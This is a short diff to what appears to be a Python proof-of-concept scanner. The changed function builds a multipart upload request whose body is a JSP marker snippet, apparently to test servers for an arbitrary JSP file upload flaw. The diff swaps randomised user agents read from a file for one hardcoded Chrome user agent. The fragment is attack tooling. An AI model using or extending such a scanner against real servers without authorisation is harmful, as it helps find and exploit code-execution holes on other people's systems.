@@ -5,12 +5,8 @@ import concurrent.futures
 import sys
 
 def poc(url):
-    # 读取 user-agents.txt 文件中的所有 user-agent 随机选择一个 user agent
-    with open('user-agents.txt', 'r') as f:
-        useragents = f.readlines()
-    random_useragent = random.choice(useragents).strip()
     headers = {
-        'User-Agent': random_useragent,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
         'Content-Type': 'multipart/form-data; boundary=-----------------------------32840991842344344364451981273'
     }
     data = """<% out.println("xhs");%>"""
